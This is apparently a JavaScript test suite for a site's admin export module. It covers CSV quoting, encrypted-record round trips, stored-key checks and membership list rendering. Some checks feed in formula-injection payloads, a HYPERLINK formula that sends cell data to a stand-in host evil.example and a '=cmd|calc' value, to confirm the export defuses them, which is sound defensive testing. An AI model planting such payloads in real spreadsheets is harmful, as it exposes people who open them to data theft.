/*
 * Checks for the pure half of apps/web/admin.js.
 *
 *     node dev/admin.test.mjs
 *
 * The CSV is the product. Everything else in this project exists to get
 * the data to this file intact, and a quoting bug here does not throw
 * and does not look wrong - it produces a file that opens cleanly in a
 * spreadsheet with one column shifted into the next, which is a export
 * nobody can tell from a good one until they act on it.
 *
 * The last section is the one worth having: a record built by the real
 * form, encrypted by the real crypto.js, decrypted, and turned into a
 * row. That is the whole pipeline, end to end, in one check.
 */
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";

const HERE = (p) => fileURLToPath(new URL(p, import.meta.url));

const load = async (path) => {
  const src = await readFile(HERE(path), "utf8");
  await import("data:text/javascript," + encodeURIComponent(src));
};

await load("../apps/web/admin.js");
// form.js's pure half reads apps/web/fields.js, which reads
// apps/web/site.config.js - both have to be loaded first, exactly as
// your-page.html's own <script> order does (0.9-M2-S2, #353).
await load("../apps/web/site.config.js");
await load("../apps/web/fields.js");
await load("../apps/web/form.js");
await load("../apps/web/crypto.js");

const { COLUMNS, entryFor, rowFor, csvCell, toCsv, toJson, fileName,
  storedKeyVerdict, storedKeyNotice, otherKeyNotice,
  MEMBERSHIP_ROLES, membershipView,
  secretOnlyNotice, refusalFor, addedNotice, removalStep } =
  globalThis.BinderAdmin;
const keyFile = JSON.parse(await readFile(HERE("test-key.json"), "utf8"));

/* A stored row straight to a CSV row. entryFor is the normalization
 * both the CSV and the dashboard read, so it is on the path here too
 * rather than being a step the tests skip. */
const row = (submission, record) => rowFor(entryFor(submission, record));

const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);

let failures = 0;
const results = [];

async function check(label, fn) {
  let ok = false;
  let note = "";
  try {
    ok = (await fn()) === true;
    if (!ok) note = "returned false";
  } catch (error) {
    note = "threw: " + (error && error.message ? error.message : error);
  }
  if (!ok) failures++;
  results.push([ok, label, note]);
}

await check("the exported object is frozen", () =>
  // This is the module where decrypt output becomes a CSV, on the one
  // page that holds every submitter's plaintext at once. An export a
  // later script can rewrite is a `toCsv` swapped for one that keeps a
  // copy. tools/check_web.py check 15 holds the rule across the whole
  // directory; this asserts it for the shipped bytes.
  Object.isFrozen(globalThis.BinderAdmin));

/*
 * A stored row and the record inside it, as admin.js sees them.
 *
 * The two identities arrive by different routes and that is the whole
 * point of them: `account_id` is a column the Worker set from a
 * verified sign-in, and `telegram` comes out of the blob the member's
 * own browser sealed. See DESIGN.md, "The identifier is the whole
 * problem".
 */
const SUBMISSION = {
  id: 7,
  account_id: "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f",
  ciphertext: "…",
  received_at: "2026-08-04T12:00:05.000Z",
};
const RECORD = {
  record: 1,
  submittedAt: "2026-08-04T12:00:00.000Z",
  telegram: "somehandle",
  weight: { kg: 90.7, lb: 200 },
  height: { cm: 177.8, totalInches: 70, feet: 5, inches: 10 },
  entered: { units: "imperial", weight: "200 lb", height: "5 ft 10 in" },
  gender: "male",
  roles: ["feedee", "gainer"],
  country: "US",
  over18: true,
};

/* ------------------------------------------------------------------ */
/* Quoting. RFC 4180, and the spreadsheet's own habits.                */

await check("an ordinary value is left alone", () =>
  csvCell("somehandle") === "somehandle");

await check("a value with a comma is quoted", () =>
  csvCell("Bonaire, Sint Eustatius and Saba") ===
    '"Bonaire, Sint Eustatius and Saba"');

/* The one that silently corrupts a file: an unescaped quote ends the
 * field early and every column after it shifts. */
await check("a quote is doubled and the field quoted", () =>
  csvCell('say "hi"') === '"say ""hi"""');

await check("a newline is quoted rather than breaking the row", () =>
  csvCell("two\nlines") === '"two\nlines"');

await check("empty and missing become an empty cell", () =>
  csvCell("") === "" && csvCell(null) === "" && csvCell(undefined) === "");

await check("numbers survive as numbers", () =>
  csvCell(90.7) === "90.7" && csvCell(0) === "0");

/*
 * Formula injection. This file is opened in Excel, Numbers or Sheets,
 * where a cell starting =, +, - or @ is executed rather than shown. The
 * form's validation means nothing legitimate starts that way - but a
 * record is whatever arrived, and the browser that produced it is not
 * one this design trusts.
 */
await check("a leading = is defused", () =>
  csvCell("=1+1") === "'=1+1");

await check("a leading @ is defused", () =>
  csvCell("@SUM(A1)") === "'@SUM(A1)");

/* Defusing and quoting compose: this one needs both, so the cell opens
 * with a quote and the apostrophe sits inside it, where the spreadsheet
 * will read it. */
await check("the classic exfiltration formula is defused", () => {
  const cell = csvCell('=HYPERLINK("http://evil.example/"&A1,"click")');
  return cell.startsWith("\"'=") && cell.includes('""http://evil.example/""');
});

await check("defusing still quotes when it has to", () => {
  const cell = csvCell("=a,b");
  return cell === '"\'=a,b"';
});

/* ------------------------------------------------------------------ */
/* One record to one row.                                              */

await check("a row has one cell per column", () =>
  row(SUBMISSION, RECORD).length === COLUMNS.length);

await check("both unit systems reach the row", () => {
  const cells = row(SUBMISSION, RECORD);
  const cell = (name) => cells[COLUMNS.indexOf(name)];
  return cell("weight_kg") === 90.7 && cell("weight_lb") === 200 &&
    cell("height_cm") === 177.8 && cell("height_feet") === 5 &&
    cell("height_inches") === 10 && cell("height_total_inches") === 70;
});

await check("what was typed reaches the row", () => {
  const cells = row(SUBMISSION, RECORD);
  const cell = (name) => cells[COLUMNS.indexOf(name)];
  return cell("entered_units") === "imperial" &&
    cell("entered_weight") === "200 lb" &&
    cell("entered_height") === "5 ft 10 in";
});

await check("the server's receipt and the client's timestamp are both kept",
  () => {
    const cells = row(SUBMISSION, RECORD);
    return cells[COLUMNS.indexOf("received_at")] === SUBMISSION.received_at &&
      cells[COLUMNS.indexOf("submitted_at")] === RECORD.submittedAt;
  });

await check("roles become one cell", () =>
  row(SUBMISSION, RECORD)[COLUMNS.indexOf("roles")] === "feedee;gainer");

/*
 * A record from an older version of the form will not carry every
 * field. An empty cell is honest; a zero or an "undefined" is a claim
 * about someone's body that nobody made.
 */
await check("a missing field is empty, not undefined", () => {
  const cells = row({ id: 1 }, { telegram: "x" });
  return cells.every((cell) => cell !== undefined && cell !== null) &&
    cells[COLUMNS.indexOf("weight_kg")] === "" &&
    cells[COLUMNS.indexOf("gender")] === "";
});

await check("an absent 18+ confirmation is not reported as yes", () =>
  row(SUBMISSION, Object.assign({}, RECORD, { over18: false }))[
    COLUMNS.indexOf("over18")] === "");

/* ------------------------------------------------------------------ */
/* The file.                                                           */

await check("the header names every column, in order", () =>
  toCsv([]).split("\r\n")[0] === COLUMNS.join(","));

await check("rows are CRLF-terminated, per RFC 4180", () => {
  const csv = toCsv([row(SUBMISSION, RECORD)]);
  return csv.endsWith("\r\n") && csv.split("\r\n").length === 3;
});

await check("a file with no rows is still a valid file", () =>
  toCsv([]) === COLUMNS.join(",") + "\r\n");

await check("the filename carries the export date", () =>
  fileName(Date.UTC(2026, 7, 4, 12, 0, 0)) ===
    "hang-gangs-binder-2026-08-04.csv");

await check("the filename takes the format it is for", () =>
  fileName(Date.UTC(2026, 7, 4), "json") ===
    "hang-gangs-binder-2026-08-04.json");

/* ------------------------------------------------------------------ */
/* The normalization both the CSV and the dashboard read.              */

await check("an entry flattens the record's nesting", () => {
  const entry = entryFor(SUBMISSION, RECORD);
  return entry.kg === 90.7 && entry.lb === 200 && entry.cm === 177.8 &&
    entry.feet === 5 && entry.telegram === "somehandle" &&
    entry.enteredUnits === "imperial" && entry.over18 === true;
});

/*
 * The identity has to survive this function or nothing downstream can
 * group on it, and dashboard.js will silently key on the handle
 * instead - a rename splitting one member into two, a mistyped handle
 * merging two members into one. entryFor is the only reading of a row
 * both the CSV and the charts get, so a field dropped here is dropped
 * everywhere at once and looks like nothing at all.
 */
await check("the account id survives the flattening", () =>
  entryFor(SUBMISSION, RECORD).accountId ===
    "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f");

/* It comes off the submission, never out of the blob. A record is
 * whatever the client sealed, so an `accountId` inside one is a claim
 * the member's own browser wrote and must not be able to move a row
 * into somebody else's history. */
await check("an account id inside the record cannot override the column",
  () => entryFor(SUBMISSION,
    Object.assign({}, RECORD, { accountId: "somebody-elses-account" }))
    .accountId === "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f");

/* Absent rather than invented, and the same null every other missing
 * field uses - dashboard.js keys its fallback on exactly this. */
await check("a row with no account id reports null, not undefined", () =>
  entryFor({ id: 1 }, { telegram: "x" }).accountId === null);

/*
 * The keyholder gets the identity in the file too, and not for
 * completeness. The CSV is what somebody deduplicates in a spreadsheet,
 * and a file that carries only the handle is a file where they
 * reproduce this exact bug by hand. The JSON export serialises the
 * entry object wholesale, so leaving the column out of the CSV would
 * also make the two downloads disagree about what a row is.
 */
await check("the account id is a column of its own", () => {
  const cells = row(SUBMISSION, RECORD);
  return COLUMNS.includes("account_id") &&
    cells[COLUMNS.indexOf("account_id")] ===
      "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f";
});

/* null, not "", so a chart can tell "no weight recorded" from a
 * weight - the CSV turns it into an empty cell on its own. */
await check("an absent number is null in an entry and empty in the CSV",
  () => {
    const entry = entryFor({ id: 1 }, { telegram: "x" });
    return entry.kg === null && entry.gender === null &&
      same(entry.roles, []) &&
      rowFor(entry)[COLUMNS.indexOf("weight_kg")] === "";
  });

/* The entry must not alias the record, or a later edit to one would
 * silently change the other. */
await check("an entry's roles are a copy, not the record's own array", () => {
  const record = Object.assign({}, RECORD, { roles: ["feedee"] });
  const entry = entryFor(SUBMISSION, record);
  entry.roles.push("gainer");
  return record.roles.length === 1;
});

await check("JSON export carries every entry and a count", () => {
  const entries = [entryFor(SUBMISSION, RECORD)];
  const parsed = JSON.parse(toJson(entries));
  return parsed.count === 1 && parsed.submissions.length === 1 &&
    parsed.submissions[0].kg === 90.7 &&
    typeof parsed.exported === "string";
});

/* No quoting rules to get wrong is the point of offering it. */
await check("JSON needs no formula guard", () => {
  const entry = entryFor(SUBMISSION,
    Object.assign({}, RECORD, { telegram: "=cmd|calc" }));
  return JSON.parse(toJson([entry])).submissions[0].telegram === "=cmd|calc";
});

/* ------------------------------------------------------------------ */
/* The key this device keeps - #70.                                    */

/*
 * What IndexedDB hands back is a `CryptoKey` object, never a JWK and
 * never bytes, so a stored record is either a key this page can derive
 * with and cannot export or it is not a stored key at all. These stand
 * in for one at each end of that: `type` and `extractable` are the two
 * properties the whole design rests on, and they are the two this
 * verdict is allowed to trust.
 *
 * The public key is a marker rather than a real point. The comparison
 * is exact string equality against whatever `config.js` carries, so a
 * recognizable string makes a failing check readable and keeps a
 * key-shaped literal out of a file that does not need one.
 */
const EXPECTED_PUBLIC_KEY = "the-public-key-config-js-carries";
const DEVICE_KEY = { type: "private", extractable: false };
const storedRecord = (over) => Object.assign({
  publicKey: EXPECTED_PUBLIC_KEY,
  privateKey: DEVICE_KEY,
  storedAt: "2026-08-08T09:00:00.000Z",
}, over || {});

await check("a stored key for the configured public key is the one to use",
  () => {
    const verdict = storedKeyVerdict(storedRecord(), EXPECTED_PUBLIC_KEY);
    return verdict.key === DEVICE_KEY && verdict.erase === false &&
      verdict.why === null;
  });

/* An empty store is the ordinary state of a device that has never been
 * used for an export. It is not a rejection, so it erases nothing and
 * says nothing: a page announcing "no key found" on every first visit
 * would be noise, and the delete under it would match nothing. */
await check("nothing stored is nothing to erase and nothing to say", () =>
  [undefined, null].every((nothing) => {
    const verdict = storedKeyVerdict(nothing, EXPECTED_PUBLIC_KEY);
    return verdict.key === null && verdict.erase === false &&
      verdict.why === null;
  }));

/*
 * Rotation, seen from the device. `config.js` naming a different public
 * key means the stored private half is the previous one: it opens the
 * rows written before the rotation and nothing since. Using it quietly
 * would report a working export that is missing every recent row, so
 * the mismatch is said out loud and the file - which is the recovery
 * root - is what the keyholder reaches for.
 */
await check("a stored key that is not the site's is surfaced, not used",
  () => {
    const verdict = storedKeyVerdict(
      storedRecord({ publicKey: "some-other-public-key" }),
      EXPECTED_PUBLIC_KEY);
    return verdict.key === null && verdict.erase === true &&
      /not the one this site encrypts to/.test(verdict.why);
  });

/*
 * The property that makes storing the key better than holding it in a
 * textarea, asserted rather than assumed. A record whose key can be
 * exported is not one importPrivateKey wrote, so something else put it
 * there; refusing it is the only reading that does not hand this page's
 * plaintext-adjacent scope an exportable key.
 */
await check("a stored key that could be exported is refused", () =>
  storedKeyVerdict(
    storedRecord({ privateKey: { type: "private", extractable: true } }),
    EXPECTED_PUBLIC_KEY).erase === true);

/*
 * The prefill's rule, on data with more at stake - #65. Every rejection
 * erases, in one place, so the guard somebody adds next cannot silently
 * keep what it refused. A single accept and one exit is what makes that
 * true by construction rather than by review.
 */
await check("every refusal of a stored record erases it and says why", () =>
  [
    storedRecord({ privateKey: undefined }),
    storedRecord({ privateKey: { type: "public", extractable: false } }),
    storedRecord({ privateKey: { type: "private", extractable: true } }),
    storedRecord({ publicKey: undefined }),
    storedRecord({ publicKey: "" }),
    storedRecord({ publicKey: "some-other-public-key" }),
    "not a record at all",
    42,
  ].every((record) => {
    const verdict = storedKeyVerdict(record, EXPECTED_PUBLIC_KEY);
    return verdict.key === null && verdict.erase === true &&
      typeof verdict.why === "string" && verdict.why.length > 0;
  }));

/* An unknown host gets no public key from config.js, so there is
 * nothing to check a stored key against. Accepting one on the strength
 * of "well, something is stored" is the failure this whole verdict
 * exists to prevent. */
await check("with no configured public key nothing stored is usable", () =>
  ["", null, undefined].every((expected) => {
    const verdict = storedKeyVerdict(storedRecord(), expected);
    return verdict.key === null && verdict.erase === true;
  }));

/*
 * What the keyholder is told about durability, which is the half of
 * this feature that can only be got wrong in words. navigator.storage
 * .persist() is a request: granted, the origin is exempt from eviction
 * under pressure and from the seven-day rule WebKit applies to origins
 * without it; refused, the key is best-effort. Copy that reads
 * "stored" as "safe" is what leaves somebody with no file in reach on
 * the day it turns out otherwise - see the spike on #85.
 */
await check("both notices say where the key is", () =>
  [true, false].every((granted) =>
    /on this device/.test(storedKeyNotice(granted))));

await check("a refused persistence request warns, and names the way back",
  () => {
    // "Evicted" was the browser's word for it and went with the
    // compression (#275). What a keyholder acts on is that the key can
    // disappear and that the file brings it back, so both halves are
    // still pinned and the mechanism's name is not.
    const notice = storedKeyNotice(false);
    return /may drop it/i.test(notice) && /key file/i.test(notice);
  });

/* A grant is not a guarantee, and the copy must not read as one: the
 * keyholder can still clear this site's data, and Clear still destroys
 * it on purpose. */
await check("a granted request still says what removes the key", () =>
  /clear/i.test(storedKeyNotice(true)));

await check("neither notice promises the key cannot be lost", () =>
  [true, false].every((granted) =>
    !/\b(forever|permanent(ly)?|guaranteed|always be here)\b/i.test(
      storedKeyNotice(granted))));

/*
 * The card a keyholder sees after pasting a key that is not this site's,
 * which is two cards rather than one because only one of them is about
 * an export that exists (#258).
 *
 * The page appends this notice to whatever the run ended with, so on a
 * key that opened nothing it lands directly under "Nothing could be
 * decrypted with this key." Any claim here that the key opens the
 * export contradicts the line above it, and a card contradicting
 * itself in consecutive sentences teaches a keyholder to stop reading
 * the card - on the one page where the next thing they are asked to
 * believe is about where their key went.
 *
 * The other direction is why this is a function rather than one
 * neutral sentence: a ROTATED key is not this site's key either, and
 * it opens every row written before the rotation. That claim is true,
 * it is the case UAT's A7 arm drives, and flattening it to be safe
 * would hide an export the keyholder is holding.
 */
const OPENING_CLAIM = /\bopens?\b|\bopened\b|\bunlocks?\b|\bdecrypt(s|ed)\b/i;

await check("the wrong-key card claims no export when nothing opened", () =>
  !OPENING_CLAIM.test(otherKeyNotice(false)));

await check("the wrong-key card still names the key as not this site's",
  // The claim is the same and the vocabulary is a member's rather than
  // a cryptographer's (#275): "the private half of the key this site
  // encrypts to" was the longest noun phrase on this page, and what a
  // keyholder holding the wrong file needs to read is that it is the
  // wrong file.
  () => [true, false].every((opened) =>
    /not this site's key/.test(otherKeyNotice(opened))));

/* A7.3 is driven on these words: it is why nothing is waiting on the
 * next visit, and it is true whether or not the export came out. */
await check("both wrong-key cards say the key is not kept on this device",
  () => [true, false].every((opened) =>
    /not kept on this device/.test(otherKeyNotice(opened))));

/* The rotated-key half, arming the fix against a flattening: a key that
 * did open the export must still be reported as having opened it. */
await check("a key that opened the export still says so", () =>
  /opens this export/.test(otherKeyNotice(true)));

await check("the two wrong-key cards are not the same sentence", () =>
  otherKeyNotice(true) !== otherKeyNotice(false));

/* ------------------------------------------------------------------ */
/* The whole pipeline.                                                 */

await check("a submitted record survives encryption and reaches the CSV",
  async () => {
    // 0.9-M2-S2 (#353) rewrote form.js's buildRecord() to a spec-derived
    // shape - {units, values: {name: string|boolean|array, ...}} - in
    // place of the hand-kept {weightLb, heightFeet, heightInches, ...}
    // this test used before. This admin pipeline check still wants a
    // real record BinderForm actually builds, so it moves with the new
    // input shape rather than constructing one by hand.
    const record = globalThis.BinderForm.buildRecord({
      units: "imperial",
      values: {
        over18: true, weight: "200", height: "5", heightCompound: "10",
        gender: "male", roles: ["feedee", "gainer"], country: "US",
      },
    }, Date.UTC(2026, 7, 4, 12, 0, 0), "@SomeHandle");

    const blob = await globalThis.BinderCrypto.encrypt(
      record, keyFile.publicKey);
    const back = await globalThis.BinderCrypto.decrypt(blob, keyFile);

    const csv = toCsv([row(
      { id: 1, received_at: "2026-08-04T12:00:05.000Z" }, back)]);
    const cells = csv.split("\r\n")[1].split(",");
    const cell = (name) => cells[COLUMNS.indexOf(name)];

    return cell("telegram") === "somehandle" &&
      cell("weight_kg") === "90.7" && cell("weight_lb") === "200" &&
      cell("height_cm") === "177.8" && cell("height_feet") === "5" &&
      cell("roles") === "feedee;gainer" && cell("over18") === "yes";
  });

/* A row that will not open must be reported, not skipped. This proves
 * the throw admin.js counts on actually happens. */
await check("a row encrypted to another key refuses to open", async () => {
  const otherKey = await crypto.subtle.generateKey(
    { name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
  const raw = new Uint8Array(
    await crypto.subtle.exportKey("raw", otherKey.publicKey));
  let binary = "";
  for (const b of raw) binary += String.fromCharCode(b);

  const blob = await globalThis.BinderCrypto.encrypt(
    { telegram: "x" }, btoa(binary));
  try {
    await globalThis.BinderCrypto.decrypt(blob, keyFile);
    return false;
  } catch (error) {
    return /could not be opened/.test(error.message);
  }
});

/* ------------------------------------------------------------------ */
/* The membership lists (#69).                                        */

/*
 * The reader that turns GET /membership into a screen.
 *
 * Every check below is aimed at the same failure: a reader that declines
 * to see part of a valid answer and reports the page as drawn anyway.
 * The rows in this response are AUTHORITY - the Worker has already
 * filtered them through the same grantsAnything() its admin check uses -
 * so a row this reader drops is a live grant that no screen shows, and
 * nothing downstream can notice, because a row that was never drawn is
 * not something a renderer can count.
 */
const ROW = (over) => Object.assign({
  account_id: "a".repeat(64),
  role: "admin",
  label: "The founder",
  added_at: "2026-08-08T09:00:00.000Z",
}, over || {});

const ANSWER = (over) => Object.assign({
  ok: true,
  membership: [],
  malformed: [],
  secretOnly: [],
}, over || {});

const rowsFor = (view, role) =>
  view.lists.filter((list) => list.role === role)[0].rows;

await check("both lists are drawn even when the answer is empty", () => {
  // The state that most needs a screen is the one with no admin rows in
  // it, because that is the lockout this issue opens with. A view built
  // from the rows it was sent would have no sections to draw at all.
  const view = membershipView(ANSWER());
  return same(view.lists.map((list) => list.role), MEMBERSHIP_ROLES) &&
    view.lists.every((list) => list.rows.length === 0);
});

await check("rows land in their own list, in the order they arrived", () => {
  const view = membershipView(ANSWER({
    membership: [
      ROW({ account_id: "b".repeat(64), label: "second" }),
      ROW({ account_id: "c".repeat(64), role: "always_allow", label: "bg" }),
      ROW({ account_id: "d".repeat(64), label: "fourth" }),
    ],
  }));
  return same(rowsFor(view, "admin").map((row) => row.label),
    ["second", "fourth"]) &&
    same(rowsFor(view, "always_allow").map((row) => row.label), ["bg"]);
});

await check("a granting row with an unknown role is reported, not dropped",
  () => {
    // THE ELSE-BRANCH. A role this page has never heard of still grants
    // whatever the Worker says it grants; sorting it into silence would
    // hide authority from the one screen that exists to show it.
    const view = membershipView(ANSWER({
      membership: [ROW({ role: "auditor", label: "a role from the future" })],
    }));
    return view.unknown.length === 1 &&
      view.unknown[0].label === "a role from the future" &&
      view.lists.every((list) => list.rows.length === 0);
  });

await check("an entry that is not a row at all is counted rather than lost",
  () => {
    const view = membershipView(ANSWER({
      membership: [null, "a string", ROW(), { role: "admin" }],
    }));
    return rowsFor(view, "admin").length === 1 && view.dropped === 3;
  });

await check("malformed rows stay in their own list", () => {
  const view = membershipView(ANSWER({
    malformed: [ROW({ account_id: "A".repeat(64), label: "typed by hand" })],
  }));
  return view.malformed.length === 1 &&
    view.malformed[0].account_id === "A".repeat(64) &&
    rowsFor(view, "admin").length === 0;
});

await check("an absent field is not an empty one", () => {
  // The whole point of `absent`. `secretOnly` empty is the flip's
  // go-signal, so a page that renders a field the Worker never sent as
  // an empty one prints a go-signal nobody gave.
  const view = membershipView({ ok: true });
  return same(view.absent.slice().sort(),
    ["malformed", "membership", "secretOnly"]);
});

await check("a field that came back empty is not reported absent", () =>
  membershipView(ANSWER()).absent.length === 0);

await check("a response that is not an object at all is all-absent", () =>
  membershipView(null).absent.length === 3 &&
  membershipView("no").lists.length === MEMBERSHIP_ROLES.length);

await check("secretOnly keeps only the ids it can draw", () => {
  const view = membershipView(ANSWER({
    secretOnly: ["e".repeat(64), 7, null, "f".repeat(64)],
  }));
  return same(view.secretOnly, ["e".repeat(64), "f".repeat(64)]) &&
    view.dropped === 2;
});

/* The go-signal, in its three states. Two of them are easy and the third
 * is the one that matters: a Worker that did not answer the question
 * must not be reported as having answered it well. */
await check("an empty secretOnly reads as the go-signal", () =>
  /go-signal/.test(secretOnlyNotice(membershipView(ANSWER()))));

await check("a non-empty secretOnly says the backfill is not finished", () => {
  const notice = secretOnlyNotice(membershipView(ANSWER({
    secretOnly: ["e".repeat(64), "f".repeat(64)],
  })));
  return /not finished/.test(notice) && /\b2\b/.test(notice);
});

await check("an absent secretOnly says so rather than claiming the signal",
  () => {
    const notice = secretOnlyNotice(membershipView({ ok: true }));
    return /did not report/.test(notice) && !/go-signal/.test(notice);
  });

await check("the secretOnly notice says the ids resolve to nobody", () =>
  /name nobody/.test(secretOnlyNotice(membershipView(ANSWER({
    secretOnly: ["e".repeat(64)],
  })))));

/*
 * The noun agrees with the number - #265 row 35.
 *
 * "1 admin(s) are granted" disagrees with itself at the count this
 * notice most often carries, and `(s)` is the tell of a number pasted
 * into a sentence rather than written into one. The site already knows
 * how to do this: submit.js writes "1 correction" / "2 corrections"
 * from a count, and UAT.md A5.3 refuses "1 corrections" in as many
 * words. Both directions, because a helper that always says "admins"
 * passes the plural half on its own.
 */
await check("one admin granted only by the secret reads as one admin", () => {
  const notice = secretOnlyNotice(membershipView(ANSWER({
    secretOnly: ["e".repeat(64)],
  })));
  return /\b1 admin is granted\b/.test(notice) && !/\(s\)/.test(notice);
});

await check("two of them read as two admins", () => {
  const notice = secretOnlyNotice(membershipView(ANSWER({
    secretOnly: ["e".repeat(64), "f".repeat(64)],
  })));
  return /\b2 admins are granted\b/.test(notice) && !/\(s\)/.test(notice);
});

/* The three refusals, which are three different acts and not three
 * different sentences. */
await check("401 discards the session and leaves", () =>
  refusalFor(401, { error: "Unauthorized." }).action === "signed-out");

await check("409 says the removal did not happen, and stays", () => {
  // The page stays and re-reads; what is particular about a 409 is the
  // sentence, not the act, so the sentence is what this pins. A `reread`
  // action was written here first and taken out - the caller re-reads
  // after every refusal that leaves the page, so nothing could ever have
  // read it, and a mutation on it reddened nothing.
  const refusal = refusalFor(409, { error: "That is the last admin row." });
  return refusal.action === "show" &&
    /last admin row/.test(refusal.message) &&
    /Nothing was removed/.test(refusal.message);
});

await check("every other refusal shows what the Worker said", () => {
  const refusal = refusalFor(400, { error: "A numeric Telegram id is needed." });
  return refusal.action === "show" &&
    refusal.message === "A numeric Telegram id is needed.";
});

await check("a refusal with no readable body still says something", () =>
  refusalFor(500, null).message === "The server answered 500." &&
  refusalFor(0, null).message === "The connection failed.");

await check("a 409 the Worker did not explain still says nothing was removed",
  () => /Nothing was removed/.test(refusalFor(409, {}).message));

/* After an add: the sentence that stops the same row being added three
 * times because nothing on the new admin's screen changed. */
await check("adding an admin says the flag arrives at the next sign-in", () => {
  const notice = addedNotice("admin", "The founder");
  return /The founder/.test(notice) && /sign out and in/.test(notice);
});

await check("adding an always-allow row says removal is not revocation", () =>
  /not a revocation/.test(addedNotice("always_allow", "Break glass")));

await check("an add with no label still reads as a sentence", () =>
  addedNotice("admin", "").length > 0 &&
  !/""/.test(addedNotice("admin", "")));

/* The two-step removal. */
await check("a removal names the row on its second press", () => {
  const row = ROW({ label: "The founder" });
  return removalStep(row, false) === "Remove The founder" &&
    /^Confirm removing The founder/.test(removalStep(row, true));
});

await check("a row with no label is not confirmed by its hex", () => {
  const text = removalStep(ROW({ label: "" }), true);
  return !/a{10}/.test(text) && text.length > 0;
});

/* ------------------------------------------------------------------ */

for (const [ok, label, note] of results) {
  console.log((ok ? "  ok   " : "  FAIL ") + label + (note ? " - " + note : ""));
}
console.log(
  failures === 0
    ? "\nadmin.js OK - " + results.length + " checks"
    : "\nadmin.js FAILED " + failures + " of " + results.length + " checks");

process.exit(failures === 0 ? 0 : 1);
